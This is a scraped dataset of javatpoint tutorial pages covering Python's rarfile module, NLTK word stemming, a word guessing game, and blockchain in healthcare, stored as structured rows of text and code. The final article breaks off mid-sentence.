'RAR3: RAR_OS_WIN32, RAR_OS_UNIX, RAR_OS_MSDOS, RAR_OS_OS2, RAR_OS_BEOS', 'RAR5: RAR_OS_WIN32, RAR_OS_UNIX', 'This attribute is used to specify the file attributes. It may be either dos-style or unix-style, depending on host_os.', 'This attribute is an optional time field specifying the time of creation. It also acts as a datetime object.', 'This attribute is also an optional time field specifying the time of last access. It also acts as a datetime object.', '13. arctime', 'This attribute is also an optional time field specifying the archival time. It also acts as a datetime object. (RAR3-only)', 'This attribute is used to specify the CRC-32 of the uncompressed file. The value of this attribute is an unsigned int.', 'RAR5: may be None.', '15. blake2sp_hash', 'This attribute is used to specify the Blake2SP hash over decompressed data. (RAR5-only)', '16. volume', 'This attribute is used to specify the volume nr, beginning from 0.', '17. volume_file', 'This attribute is used to specify the volume file name where the file begins.', '18. file_redir', 'This attribute consists of a tuple of (type, flags, target). (RAR5-only). If not None, the file is the link of some sort. (RAR5-only)', 'Type is one of the constants:', 'Flags may contain bits:', '19. is_dir()', 'This method is used to return True if the entry is a directory.', 'New in version 4.0.', '20. is_symlink()', 'This method is used to return True if the entry is a symlink.', 'New in version 4.0.', '21. is_file()', 'This method is used to return True if the entry is a normal file.', 'New in version 4.0.', '22. needs_password()', 'This method is used to return True if data is stored password protected.', '23. isdir()', 'This method is used to return True if the entry is a directory.', 'Deprecated since version 4.0.', 'The RarExtFile class of the rarfile module works as a base class for objects similar to the file that RarFile.open() returns.', 'Bases: io.RawIOBase', 'The syntax for the RarExtFile class is shown below:', 'This class provides public methods and common CRC checking', 'Some attributes and methods of the RarExtFile class are shown below:', '1. name= None', 'This attribute is used to specify the file name of the archive entry', '2. read(n=-1)', 'This method is used to read all or a specified amount of data from archive entry.', '3. close()', 'This method is used to close open resources.', '4. readinto(buf)', 'This method is used to define zero-copy read directly into the buffer. It Returns bytes read.', 'This method returns the current reading position in uncompressed data.', '6. seek(offset, whence = 0)', '7. readable()', 'This method returns True', '8. writable()', 'This method returns False as writing is not supported.', '9. seekable()', ""This method returns True as seeking is supported, although it's slow on compressed files."", '10. readall()', 'This method is used to read all the remaining data', '11. fileno()', 'This method returns the underlying file descriptor if one exists. OSError is raised if the IO object does not utilize a file descriptor.', '12. isatty()', ""This method returns if this is an 'interactive' stream. It also returns False if it can't be determined."", '13. readline()', '14. readlines()', 'Bases: datetime.datetime', 'New in version 4.0', 'The syntax of the nsdatetime class is shown below:', 'Some attributes and methods of the nsdatetime class are shown below:', '1. nanosecond', 'This attribute consists of the number of nanoseconds ranging from 0 to 999999999.', ""2. isoformat(sep = 'T', timespec = 'auto')"", 'This method is used to format with nanosecond precision by default.', '3. astimezone(tz=None)', 'This method is used to convert to new time zone.', 'This method is used to return new timestamp with given fields replaced.', 'Some of the functions of the rarfile module are as follows:', 'Some of the constants of the rarfile module are as follows', 'Some of the Warnings and Exceptions of the rarfile module are as follows:', 'Let us now consider the following example demonstrating the working of the rarfile module.', 'Explanation:']","['The object is seek-able, although the seeking is quick only on uncompressed files. On compressed files, the seeking is implemented by reading ahead and restarting the decompression.', ""This attribute contains the name of the file with a relative path. The value of this attribute is always a Unicode string specifying the path separated by a Path separator as '/'."", ""This attribute consists of the timestamp of File modification. It can be used as a tuple of (year, month, day, hour, minute, second). RAR5 allows archives where it is missing, and it's None then."", 'This attribute is used to specify the time of the file modification. The value can be the same as the date_time attribute; however, as a datetime object with extended precision.', 'This method is used to seek data. On uncompressed files, the seeking works by actual seek, so it is fast. On compressed files, it is slow - forward seeking happens by reading ahead, backward by re-opening and decompressing from the start.', 'This method is used to return a list of lines from the stream. We can specify the hint to control the number of lines read: no more lines will be read if the total size (in bytes/characters) of all lines so far exceeds the hint.', 'The nsdatetime class of the rarfile module represents the Datetime that carries nanoseconds. This class does not support Arithmetic and will lose nanoseconds.', '4. replace(year = None, month = None, day = None, hour = None, minute = None, second = None, microsecond = None, tzinfo = None, *, fold = None, nanosecond = None)']","['If the above Python file does not raise any import error, we are good to go and head onto the Facebook messenger bot building procedure. However, if it does raise an exception, it is recommended to reinstall the module and refer to its official documentation.', ""This method is used to read and return a line from the stream. The line terminator is always b'n' for binary files; for text files, we can use the newlines argument to open in order to select the line terminator(s) recognized. If the size is given, size bytes will be read at most."", 'In the above snippet of code, we have imported the required module. We have then used the RarFile class to select the RAR archive. We have then used the for-loop to iterate through the files present in the archive and print the filenames along with their sizes. We have then used the if conditional statement to check if the RAR archive contains a readme.txt file. At last, we have read the file using the read() method.']","['$ pip3 install rarfile', 'import rarfile', '$ python verify.py', ""class rarfile.RarFile(file, mode='r', charset=None, info_callback=None, crc_check=True, errors='stop', part_only=False)"", 'class rarfile.RarInfo', 'class rarfile.RarExtFile', 'class rarfile.nsdatetime', '# importing the required module', 'import rarfile', '# using the RarFile class', 'myRarFile = rarfile.RarFile(""myfolder.rar"")', '# iterating through the files in the archive', 'for file in myRarFile.infolist():', '# printing the filenames and file sizes', 'print(file.filename, file.file_size)', '# checking the readme file', 'if file.filename == ""myfolder/readme.txt"":', '# reading the file', 'print(myRarFile.read(file))']","['myfolder/helloWorld.py 101', 'myfolder/image.jpg 281466', 'myfolder/readme.txt 49', ""b'Hello Python learners!\\r\\nWelcome to Javatpoint.com'"", 'myfolder/ 0']","['S. No.|||Functions|||Descriptions&&&1|||rarfile.is_rarfile(xfile)|||This function is used to check if the file is a RAR archive.&&&2|||Rarfile.is_rarfile_sfx(xfile)|||This function is used to check if the file is a RAR archive with support for SFX.It will read 2M from file.', 'S. No.|||Constants|||Descriptions&&&1|||rarfile.RAR_M0 = 48|||This constant represents no compression.&&&2|||rarfile.RAR_M1 = 49|||This constant represents compression level - m1, the Fastest compression.&&&3|||rarfile.RAR_M2 = 50|||This constant represents compression level - m2.&&&4|||rarfile.RAR_M3 = 51|||This constant represents compression level - m3.&&&5|||rarfile.RAR_M4 = 52|||This constant represents compression level - m4.&&&6|||rarfile.RAR_M5 = 53|||This constant represents compression level - m5, which is also the maximum compression.&&&7|||rarfile.RAR_OS_WIN32 = 2|||This constant represents the type of Operating System, i.e., Windows.&&&8|||rarfile.RAR_OS_UNIX = 3|||This constant represents the type of Operating System, i.e., UNIX.&&&9|||rarfile.RAR_OS_MACOS = 4|||This constant represents the type of Operating System, i.e., MacOS (Only in RAR3).&&&10|||rarfile.RAR_OS_BEOS = 5|||This constant represents the type of Operating System, i.e., BeOS (Only in RAR3).&&&11|||rarfile.RAR_OS_OS2 = 1|||This constant represents the type of Operating System, i.e., OS2 (Only in RAR3).&&&12|||rarfile.RAR_OS_MSDOS = 0|||This constant represents the type of Operating System, i.e., MS-DOS (Only in RAR3).', 'S. No.|||Warnings & Exceptions|||Descriptions&&&1|||class rarfile.UnsupportedWarning|||This warning occurs when the archive uses a feature that is not supported by the rarfile module.New in Version 4.0.&&&2|||class rarfile.Error|||This exception is the base class for rarfile errors.&&&3|||class rarfile.BadRarFile|||This exception raises when there is incorrect data present in the archive.&&&4|||class rarfile.NotRarFile|||This exception raises when the file is not a RAR archive.&&&5|||class rarfile.BadRarName|||This exception raises when the system cannot guess multipart name components.&&&6|||class rarfile.NoRarEntry|||This exception raises when the file is not found in RAR.&&&7|||class rarfile.PasswordRequired|||This exception raises when the file requires a password.&&&8|||class rarfile.NeedFirstVolume(msg, volume)|||This exception raises when we have to start from the first volume.&&&9|||class rarfile.NoCrypto|||This exception raises when we cannot parse encrypted headers - no crypto available.&&&10|||class rarfile.RarExecError|||This exception raises when the problem is reported by unrar/rar.&&&11|||class rarfile.RarWarning|||This exception raises when there is a non-fatal error.&&&12|||class rarfile.RarFatalError|||This exception raises when there is a fatal error.&&&13|||class rarfile.RarCRCError|||This exception raises when there is a CRC error during unpacking.&&&14|||class rarfile.RarLockedArchiveError|||This exception raises when we try to modify the locked archive.&&&15|||class rarfile.RarWriteError|||This exception raises when we try writing a RAR file.&&&16|||class rarfile.RarOpenError|||This exception raises when we try opening a RAR file.&&&17|||class rarfile.RarUserError|||This exception represents user error.&&&18|||class rarfile.RarMemoryError|||This exception represents memory error.&&&19|||class rarfile.RarCreateError|||This exception represents a creation error.&&&20|||class rarfile.RarNoFilesError|||This exception raises when there are no files that match patterns were found.&&&21|||class rarfile.RarUserBreak|||This exception raises when the user stops.&&&22|||class rarfile.RarWrongPassword|||This exception raises incorrect passwords.&&&23|||class rarfile.RarUnknownError|||This exception represents an unknown exit code.&&&24|||class rarfile.RarSignalExit|||This exception raises when unrar exited with a signal.&&&25|||class rarfile.RarCannotExec|||This exception raises when there is no executable found.']","[""|||name - This parameter is a name of the file or an instance of RarInfo.|||mode - This parameter is the mode in which the file is to be opened. It must be 'r'.|||pwd - This parameter includes the password that is used for extraction.||||||name - This parameter is a name of the file or an instance of RarInfo.|||pwd - This parameter includes the password that is used for extraction.||||||member - This parameter is a name of the file or an instance of RarInfo.|||path - This is an optional parameter that includes the destination path.|||pwd - This is another optional parameter that includes the password to utilize.||||||pwd - This is another optional parameter that includes the password to utilize.||||||RAR5_XREDIR_UNIX_SYMLINK: Unix symlink|||RAR5_XREDIR_WINDOWS_SYMLINK: Windows symlink|||RAR5_XREDIR_WINDOWS_JUNCTION: Windows junction|||RAR5_XREDIR_HARD_LINK: A hard link to the target|||RAR5_XREDIR_FILE_COPY: The current file is a copy of another archive entry||||||RAR5_XREDIR_ISDIR: Symlink points to a directory|||&&&|||This module parses archive structure with the Python programming language.|||It extracts non-compressed files using Python.|||It also extracts files that are compressed using unrar.|||Optionally, we can also write compressed data to a temp file in order to speed up unrar; otherwise, it requires scanning the entire archive on every execution.||||||RarFile class|||RarInfo class|||RarExtFile class|||nsdatetime class||||||path - This is an optional parameter that includes the destination path.|||members - This is another optional parameter that includes a name of the file or an instance of RarInfo.||||||No short reads - read(), and readinfo() read as much as requested.|||No internal buffer; we have to use BufferedReader for that.|||""]"
447,['Stemming Words using Python'],"['In the following tutorial, we will understand the process of stemming words using the NLTK (Natural Language Toolkit) package in the Python programming language.']","['https://www.javatpoint.com/python-program-for-word-guessing-game', 'https://www.javatpoint.com/rarfile-module-in-python', 'https://www.javatpoint.com/python-program-for-word-guessing-game', 'https://www.javatpoint.com/rarfile-module-in-python', 'https://www.javatpoint.com/python-program-for-word-guessing-game']",[],[],"['Understanding the Errors in Stemming', 'Understanding the applications of Stemming', 'Understanding the Stemming Algorithms', 'Implementation of Stemming in Python']","[""Porter's Stemmer Algorithm"", 'Lovins Stemmer', 'Dawson Stemmer', 'Krovetz Stemmer', 'Xerox Stemmer', 'N-Gram Stemmer', 'Snowball Stemmer', 'Lancaster Stemmer']",[],"['An Introduction to Stemming', 'Let us now understand the errors in Stemming.', 'The Errors in Stemming are mainly classified into two categories:', 'Let us now look at some of the applications of Stemming.', 'Some applications of Stemming are as follows:', 'Some of the Stemming Algorithms are as follows:', 'Let us now discuss these Stemming Algorithms in brief.', 'Suppose that EED -> EE means ""if the word has at least one vowel and consonant plus EED ending, change the ending to EE"" as \'agreed\' becomes \'agree\'.', 'Advantage: It produces the best output compared to other stemmers with less error rate.', 'Limitation: Morphological modifications produced are not always real words.', 'For example, sitting -> sitt -> sit', ""Advantage: Lovins Stemmer is fast and manages irregular plurals. For example, 'teeth' and 'tooth', etc."", 'Limitation: The process is time-consuming and frequently fails to form words from the stem.', 'It is an extension of Lovins stemmer in which suffixes are accumulated in the inverted order indexed by their length and last letter.', 'Advantage: The execution of Dawson Stemmer is fast and covers more suffices.', 'Limitation: The implementation is very complex.', 'Krovetz Stemmer was proposed in the year 1993 by Robert Krovetz. This stemming algorithm follows some steps shown below:', ""For example, 'children' -> 'child'"", 'Advantage: Krovetz Stemmer is light, and we can use it as a pre-stemmer for other stemmers.', 'Limitation: This stemming algorithm is inefficient in the case of large documents.', 'For example:', 'children -> child', 'understood -> understand', 'whom -> who', 'best -> good', 'An N-Gram is a set of n consecutive characters extracted from a word in which similar words will have a high proportion of n-grams in general.', ""For example, 'INTRODUCTIONS' for n = 2 becomes: *I, IN, NT, TR, RO, OD, DU, UC, CT, TI, IO, ON, NS, S*"", 'Advantage: This stemming algorithm is based on string comparisons and is language-dependent.', 'Limitation: It needs space to create and index the n-grams, which is not time efficient.', 'Now, let us see the implementation of the Stemming using the NLTK package in the Python programming language.', 'Let us consider the following example demonstrating the implementation of the Stemming using the NLTK package in Python.', 'Explanation:', 'Explanation:']","['It is proposed by Lovins in the year 1968 that removes the longest suffix from a word, and then the word is recorded in order to convert this stem into valid words.', 'As we can observe, we have not used the word_tokenize() function in the above example. Let us consider another example demonstrating the stemming along with the word_tokenize() function.']","['Stemming is a significant part of the pipelining procedure in Natural Language Processing. Stemming is the process of generating morphological modifications of a root/base word. Stemming programs are generally considered as stemming algorithms or stemmers. A stemming algorithm reduces the words like ""retrieves"", ""retrieved"", ""retrieval"" to the root word, ""retrieve"" and ""Choco"", ""Chocolatey"", ""Chocolates"" reduce to the stem ""chocolate"". The input to the stemmer is tokenized words. But where do these tokenized words come from? Well, tokenization includes breaking down the document into distinct words. To know more about tokenization, one can refer to the tutorial on ""Tokenization in Python"".', ""Porter's Stemmer Algorithm is among the famous stemming method proposed in the year 1980. The concept is based on the principle that the suffixes in the English language are made up of a combination of smaller and simpler suffixes. This stemmer is popular for its speed and simplicity. The chief applications of Porter Stemmer involve data mining and data recovery. However, these applications are only limited to English words. Moreover, the group of stems is mapped onto the same stem, and the output stem is not necessarily a meaningful word. The algorithms are quite lengthy and are called to be the oldest stemmer."", 'Xerox Stemmer is equipped to manage large data and can generate valid words. However, over stemming is high as its dependence on lexicon makes it language-dependent. Thus, the main limitation of this stemming algorithm is that it is language-specific.', ""Unlike the Porter Stemmer, the Snowball Stemmer can map non-English words too. Since this stemming algorithm supports multiple languages, we can call the Snowball Stemmer a multi-lingual stemmer. The Snowball stemmer is also imported from the NLTK package. This algorithm is based on a programming language known as 'Snowball' that processes small strings and is the most widely utilized Stemmer. This Stemming algorithm is way more aggressive than Porter Stemmer and is also considered Porter2 Stemmer. Due to the improvements included when compared to the Porter Stemmer, the Snowball stemmer has great computational speed."", 'The Lancaster stemmers are more aggressive, and dynamic compared to the other two algorithms. This stemming algorithm is fast; however, it is confusing when dealing with small words. However, there are not as efficient as Snowball Stemmers. The Lancaster stemmers save the rules externally and fundamentally utilize an iterative algorithm.', 'In the above snippet of code, we have imported the required modules. We have then created an object of the PorterStemmer class of the NLTK package. We have then created a list of words that has to be stemmed. We have, at last, used the for-loop to iterate through the words in the list and stemmed them using the stem() function.', 'In the above snippet of code, we have imported the required modules and created an object of the PorterStemmer class. We have then defined a string that has to be stemmed. We have then used the word_tokenize() function to tokenize the sentence. At last, we have used the for-loop to iterate through the list of words and stemmed them using the stem() function.']","['# importing the required modules', 'from nltk.stem import PorterStemmer', 'from nltk.tokenize import word_tokenize', '# creating an object of the PorterStemmer class', 'pStemmer = PorterStemmer()', '# selecting some words to be stemmed', 'list_of_words = [""consult"", ""consultant"", ""consulting"", ""consultantative"", ""consultants"", ""consulting""]', 'for words in list_of_words:', 'print(words + "": "" + pStemmer.stem(words))', '# importing the required modules', 'from nltk.stem import PorterStemmer', 'from nltk.tokenize import word_tokenize', '# creating an object of the PorterStemmer class', 'pStemmer = PorterStemmer()', '# given sentence', 'sentence = ""People comes to consultants office to consult the consultant""', '# tokenizing the sentence', 'list_of_words = word_tokenize(sentence)', 'for words in list_of_words:', 'print(words, "" : "", pStemmer.stem(words))']","['consult: consult', 'consultant: consult', 'consulting: consult', 'consultantative: consult', 'consultants: consult', 'consulting: consult', 'People  :  peopl', 'comes  :  come', 'to  :  to', 'consultants  :  consult', 'office  :  offic', 'to  :  to', 'consult  :  consult', 'the  :  the', 'consultant  :  consult']",[],"['|||Over-stemming: This error arises when two words stem from the same root of different stems. Over-stemming can also be regarded as False positives.|||Under-stemming: This error raises when two words are stemmed from the same root that is not of different stems. Under-stemming can also be considered as False negatives.||||||We can use Stemming as the search engine in Information Recovery Systems.|||We can also use Stemming in order to determine domain vocabularies in Domain Analysis.|||An Interesting fact is that Google searched adopted the word stemming in the year 2003. Previously a search for ""fish"" would not have returned ""fishes"" or ""fishing"".||||||Porter\'s Stemmer Algorithm|||Lovins Stemmer|||Dawson Stemmer|||Krovetz Stemmer|||Xerox Stemmer|||N-Gram Stemmer|||Snowball Stemmer|||Lancaster Stemmer||||||Converting the plural form of a word to its singular form.|||Converting the past tense of a word to its present tense and removing the suffix \'ing\'.|||']"
448,['Python Program for Word Guessing Game'],"['Python is an extremely versatile programming language employed by many large companies. It is a simple and easy-to-understand syntax, which makes it perfect for those trying to master computer programming for the first time. It is a high-level programming language. Its fundamental design principle is about understanding code and the syntax that lets programmers communicate concepts within a few lines of code.']","['https://www.javatpoint.com/blockchain-in-healthcare-innovations-and-opportunities', 'https://www.javatpoint.com/stemming-words-using-python', 'https://www.javatpoint.com/blockchain-in-healthcare-innovations-and-opportunities', 'https://www.javatpoint.com/stemming-words-using-python', 'https://www.javatpoint.com/blockchain-in-healthcare-innovations-and-opportunities']",[],[],"['Random Module:', 'Conclusion']",['Word Guessing Game:'],[],"['In this tutorial, we have discussed how we can use random module, for developing a word guessing game in Python.']",[],"['In this tutorial, we\'ll use the ""random module"" to play an interactive game of word guessing. This game is intended for those who are just beginning to learn to code in Python and will give them an overview of strings, loops, and conditional (If, otherwise) statements.', ""Sometimes, we need the computer to choose the random number from the specified range, choose an element randomly from a set, choose the random card from an assortment of decks, flip a coin, and so on. The random module allows the ability to access functions that can support these kinds of operations. One of these operations is the random.choice() technique (returns an unspecified item from a tuple, list, or string.) which we'll make use of to choose the random words from a set of terms we've generated."", 'The game involves an array of words from which our interpreter will select one random word. The player must first input their names and is challenged to guess the alphabet of their choice after that. If the random word is comprised of the alphabet, it will be displayed in the output (with proper placement); otherwise, the program will prompt you to choose an alternative alphabet. Users will be given 12 turns (can be modified according to) to determine the full word. Below is an example of the Python implementation:']","['# First, we will import the library that we will be using to choose', '# any random words from a list of words', 'import random as rdm', '# Here the user will be asked to enter their name first', 'name1 = input(""What is your NAME ? "")', 'print(""Best of Luck! "", name1)', ""words1 = ['Donkey', 'Aeroplane', 'America', 'Program',"", ""'Python', 'language', 'Cricket', 'Football',"", ""'Hockey', 'Spaceship', 'bus', 'flight']"", '# rdm.choice() function will choose one random word from the gven list of words', 'word1 = rdm.choice(words1)', 'print (""Please guess the characters: "")', ""guesses1 = ''"", '# we can use any number of turns here', 'turns1 = 10', 'while turns1 > 0:', '# counting the number of times a user is failed to guess the right character', 'failed1 = 0', '# all the characters from the input word will be taken one at a time.', 'for char in word1:', '', '# here, we will comparing that input character with the character in guesses1', 'if char in guesses1:', 'print(char)', '', 'else:', 'print(""_"")', '', '# for every failure of the user 1 will be incremented in failed1', 'failed1 += 1', '', 'if failed1 == 0:', ""# user will win the game if failure is 0 and 'User Win' will be given as output"", 'print(""User Win"")', '', '# this will print the correct word', 'print(""The correct word is: "", word1)', 'break', '# if the user has input the wrong alphabet then', '# it will ask user to enter another alphabet', 'guess1 = input(""Guess another character:"")', '# every input character will be stored in guesses', 'guesses1 += guess1', '# here, it will check input with the character in word', 'if guess1 not in word1:', '', 'turns1 -= 1', '', '# if the input character doesnot match the word', '# then ""Wrong Guess"" will be given as output', 'print(""Wrong Guess"")', '', '# this will print the number of turns left for the user', 'print(""You have "", + turns1, \'more guesses \')', '', '', 'if turns1 == 0:', 'print(""User Loose"")']","['What is your NAME ?  JavaTpoint', 'Best of Luck!  JavaTpoint', 'Please guess the characters:', '_', '_', '_', '_', '_', '_', '_', 'Guess another character: D', 'Wrong Guess', 'You have  9 more guesses', '_', '_', '_', '_', '_', '_', '_', 'Guess another character: C', 'Wrong Guess', 'You have  8 more guesses', '_', '_', '_', '_', '_', '_', '_', 'Guess another character: H', 'Wrong Guess', 'You have  7 more guesses', '_', '_', '_', '_', '_', '_', '_', 'Guess another character: F', 'Wrong Guess', 'You have  6 more guesses', '_', '_', '_', '_', '_', '_', '_', 'Guess another character: f', 'Wrong Guess', 'You have  5 more guesses', '_', '_', '_', '_', '_', '_', '_', 'Guess another character: b', 'Wrong Guess', 'You have  4 more guesses', '_', '_', '_', '_', '_', '_', '_', 'Guess another character: P', 'P', '_', '_', '_', '_', '_', '_', 'Guess another character: r', 'P', 'r', '_', '_', 'r', '_', '_', 'Guess another character: o', 'P', 'r', 'o', '_', 'r', '_', '_', 'Guess another character: g', 'P', 'r', 'o', 'g', 'r', '_', '_', 'Guess another character: a', 'P', 'r', 'o', 'g', 'r', 'a', '_', 'Guess another character: m', 'P', 'r', 'o', 'g', 'r', 'a', 'm', 'User Win', 'The correct word is:  Program']",[],[]
449,['Blockchain in Healthcare: Innovations & Opportunities'],"['With the big leap into the health sector, it has made a huge leap towards Blockchain as well as AI. The industry has introduced new technologies that help make the healthcare industry more secure, safe, and resource intensive. Companies involved in healthcare are also emerging as market leaders through the adoption of fundamental Blockchain technology.']","['https://www.javatpoint.com/snake-game-in-python-using-turtle-module', 'https://www.javatpoint.com/python-program-for-word-guessing-game', 'https://www.javatpoint.com/snake-game-in-python-using-turtle-module', 'https://www.javatpoint.com/python-program-for-word-guessing-game', 'https://www.javatpoint.com/snake-game-in-python-using-turtle-module']","['https://static.javatpoint.com/python/images/blockchain-in-healthcare-innovations-and-opportunities.png', 'https://static.javatpoint.com/python/images/blockchain-in-healthcare-innovations-and-opportunities2.png', 'https://static.javatpoint.com/python/images/blockchain-in-healthcare-innovations-and-opportunities3.png', 'https://static.javatpoint.com/python/images/blockchain-in-healthcare-innovations-and-opportunities4.png']",[],"['Blockchain use cases in Healthcare', 'Conclusion']","['Significant Growth in the Healthcare Space', 'Extensive Research in the Field of Blockchain and Healthcare', 'Blockchain to Increase Healthcare Security', 'Scanning for Fraud in the Healthcare Space', 'Patient Identification using Blockchain', 'Security Risks Associated with Connected Healthcare Partners', 'Integrating the Healthcare System via Blockchain', 'Mitigating Risk with Blockchain', 'Blockchain for Emerging Technologies', 'Blockchain and Compliance (HIPAA, GDPR, etc.)', 'Advanced Artificial Intelligence and Cybersecurity in Healthcare']",[],"['This is the point where Blockchain is able to offer transparency in the area.', '1. Better Security and Monitoring', '2. Tracking Packages and Medical Zoning at Scale', '3. At-source Fraud Detection using Scanners', 'The most important thing is to minimize risk. The following strategies can achieve this:', '1. Building a Strong Private Blockchain Network', '2. Blockchain with Decentralized Authorization Blockchain', '3. Map Processes and Global Policies', '4. Verifying Exchanges between Networks via the Ledger']","[""Both Aetna along Anthem is working together with Blockchain to bring new value-added in the sector. They're taking advantage of the flexibility and multi-dimensional capabilities of Blockchain to create more innovative solutions in the industry."", 'In the end, it comes down to how we harness the potential of these technologies from a holistic view. We must combine the potential of Blockchain alongside other technologies in order to develop an optimum approach to integration.', 'No matter what device is employed, access will only be granted if the device is connected to the internet. This creates a security layer that protects against hackers.', 'A simple hack or spyware email account could be enough to undermine the whole model. It could be the basis for an improved and consistent attack format that is able to be used for a long time after the first placeholder has been introduced.']","['Research suggests that the worldwide blockchain technology for the healthcare industry is expected to grow at 64 percent. The coming years will be crucial for Blockchain as a technology, both from an implementation perspective. From a technical standpoint, Blockchain offers unique advantages that only technology can offer. Blockchain is the only technology or component which can compete on this scale. In terms of data security to connectivity, Blockchain is far ahead of market expectation in this area. Healthcare is experiencing numerous benefits of using this technology and integrating it into security privacy, privacy, compliance, and regulation.', 'From a cost perspective, the savings derived through the technology is far more than the cost from a cost standpoint. The ROI of implementing Blockchain has been overwhelmingly overwhelming as a lot of companies have embraced it to make use of it as an integral resource. The Blockchain technology solution is also able to be implemented on a need-to-know basis in specific areas that are part of the overall theme.', ""In keeping this integration in mind, a number of insurance firms and healthcare IT companies are making their way into the market. They're working with the most innovative companies in the field while offering unique benefits to the companies. They're establishing connections to IBM, Google, and Facebook to find the most efficient scenarios to increase value-added."", 'With the help of core technology which includes data analytics, everything from patient care to healthcare operations can be improved. Many insurance companies are using smart contracts which take data directly from patients without needing personal details.', 'This is a safer way to interact with technology and understand its value. Additionally, Blockchain in healthcare is proving to be beneficial in the EHR space. This has made doctors and specialists more connected with the information shared across critical systems.', 'Retail-chain leader Walmart also obtained a patent to leverage Blockchain for medical records and conducted overall research in the hospitals in the coverage network. This has helped them produce tremendous results within the space, thereby giving rise to a more coherent system of channels in the healthcare industry.', ""They can produce medication, release documents, and remain compliant with all governing bodies that regulate the industry. Walmart doesn't then need to hire lengthy staff contracts to ensure that they're able to deliver the medicines on time every time. Using Blockchain is helping them be more in line with the industry when it comes to the use of medicinal products."", ""Researchers are developing alternative solutions to traditional methods of keeping data and using databases. They're moving to an overall model where Blockchain is being marketed as a possible option. But this field is dominated by technologists who are in complete control of the latest technologies."", 'Tech companies are in the process of developing innovative ways of harnessing the fundamental technology behind Blockchain. Duke researchers have been working for novel ways of integrating AI, Blockchain, and new technologies to provide more quality healthcare services.', ""Analysts are looking over the data and conclude that the impact of all research is not restricted to the Healthcare area. The impact can be felt in a range of different areas connected to the healthcare sector. Medical devices, to records archive, there're a variety of possibilities in the healthcare area."", ""Blockchain has been extensively utilized to increase the storage of data and the privacy of patient records. The technology is being used for ensuring it is that the Healthcare value chain can be sustained and also. It is crucial to understand this since many professionals in the field are investigating the full potential of this technology, too. They're creating nuanced solutions that are based on Blockchain technologies within the overall ecosystem. In the ideal scenario, the best approach to look at Blockchain is to know how it influences the Healthcare area in general."", ""From billing to the introduction of the patient, there are a variety of aspects of the patient's journey which Blockchain can assist with. It will provide greater security for the value system so that information is not mishandled, and all regulations are in place as per the norm. It also provides greater control of the information that flows from one end."", 'Healthcare leaders should look at the technology from a comprehensive perspective and consider all the possibilities available. From healthcare fraud to in-coming security, many applications of the technology have not yet been fully explored. When a patient travels from one place to the next and back, the proper transfer of information is essential. This is why Blockchain allows sharing secure data through a planned pathway.', 'The nature of Blockchain guarantees that there are no one or two nodes that could store all the information in one place. The distributed ledger guarantees the integrity of data as well. This means that each location within the network is equally responsible for the overall success of the network. In terms of storing data outside of conventional servers, Blockchain can facilitate that also.', 'The National Health Care Anti-Fraud Association (NHCAA) has revealed that the financial cost of fraud in healthcare is close to $10 billion per year. This includes prescription drugs delivery systems, drugs, and other systems that facilitate fraud in the healthcare industry. This has led to numerous agents releasing fake medicines and, in many instances, fake equipment.', ""There are many kinds of fraud in healthcare, but the goal is the same - reducing costs to provide lower quality. This is a major issue for the areas like trust and confidence within the healthcare system. Suppose trust is eroded in the healthcare field and causes problems with security and can lead to a larger size. There are loopholes that counterfeiters are able to exploit to profit from the system. Counter-measure mechanisms are also in place that can't address these problems in time."", 'Blockchain gives greater assurance of the model in all. Doctors, medical professionals as well as researchers can access sufficient data based on their level of authentication. Blockchain will check back against higher standards in authentication and security protocols. This information is stored. Because retrieval is less than an hour, Blockchain can enable quicker authentication, which discourages hackers. The right individuals will be granted access to the right data and files at the most appropriate moment.', ""Global Healthcare leader Merck has created its patent-pending technology for authenticating the authenticity of medical devices and prescription drugs through Blockchain. It's among the most cutting-edge ways Merck is battling counterfeit dealers and drug dealers. It accomplishes this by creating an electronic fingerprint of the object's physical form in the digital world. After being authenticated, the agent is required to look for the fingerprint that matches. This provides greater security throughout the board, thanks to an enhanced model of authentication."", 'Blockchain technology can limit access to medicines on a large scale. Blockchain can be utilized to find information about the packaging that will define the roles of the sender and recipient. The overall strategy adopted by Blockchain will allow for better integration across all levels. When a package is removed from a specific facility, it leaves with a tracking number. The metadata, the name, the sending ID, and other data are retrieved by Blockchain to allow all the relevant data. This makes the entire business safer in general.', ""In remote areas, there are often insufficient or no-existent checks for counterfeit medicines. This creates a perfect opportunity for counterfeiters to take profit from the circumstance. This is why Blockchain is able to provide the correct tracking and identification information to the person who is responsible. Because it's a much more efficient resource to use regardless of the fact that a single server fails, the network is operational. The data is stored across the entire ledger, making it easier to access once the problem is resolved."", 'One of the most immediate applications of Blockchain that many businesses are incorporating as of today is the model for identifying patients. Patients are becoming increasingly disoriented, and more information is being released every minute. This has resulted in an increase in Blockchain acceptance due to the greater security it offers. Analysts estimate that more than 6.1 million records were exposed in the last year alone due to inadvertent breaches of security and the mismanagement of the main IT system.', 'Ransomware or Malware is in the news and many businesses not being able to discern how to handle information. Since data is spread across different healthcare providers and organizations, it is good to use a distributed ledger rather than the traditional data warehouse that stores data.', ""Although the ecosystem is essential to sustain, it's also an ever-changing field extremely relevant to the business. It has transformed the healthcare sector into an information-driven one, as well as an area that's taken on technological advances. Blockchain can be a great fit for this model as it offers a highly scalable solution that operates within a technological environment."", ""There are numerous companies within the Blockchain sector that work closely with hospitals to ensure that patient data is effectively used. From an operational standpoint, it's a better method to manage hospital activities. Blockchain's reliability and consistency are unrivalled compared to standard processes."", 'Identification of patients is among the most important areas in which privacy is secured through interactions within health care. More and more companies are calling to ensure greater security and protection for patients. ID through Blockchain is becoming a viable option. From a compliance perspective, it is logical. The entire healthcare system to stay as secure as it can be and secure all data. This is the most efficient way to handle a complex area such as Healthcare while keeping all information secured.', ""With the healthcare sector becoming more connected, it's vital to use Blockchain to safeguard all the participants. From patients who are dying to doctors in the field, it's essential to ensure that all parties are on the same page with regard to Blockchain security on the network. Furthermore, it's a safe approach to this new technology, as there are many nefarious organizations worldwide that would like access to protected data."", ""It's crucial to have the proper infrastructure to create an effective and secure Blockchain network. The private Blockchain will be able to safeguard the data and also secure the ledgers. Blockchains can provide more security for all involved parties and create a more collaborative environment. Data flows smoothly between different locations without having to worry about hacking or other unauthorized access points. From a compliance point of view, this is taking it one step further. It's a way to show your stakeholders that you're a more regulated company."", 'Although the Blockchain is very secure, access and authorization require some effort. This is where bio-authentication comes into play. The diagram that is used for reference is shown below. The authentication server, as well as the client, are both connected to the Blockchain; however, access is only granted in the event that an additional parameter is provided. This could be an access-oriented client or an element of biomechanical origin. It may be the model for physical authentication or an additional avenue of exploration.', 'To allow the Blockchain to be truly 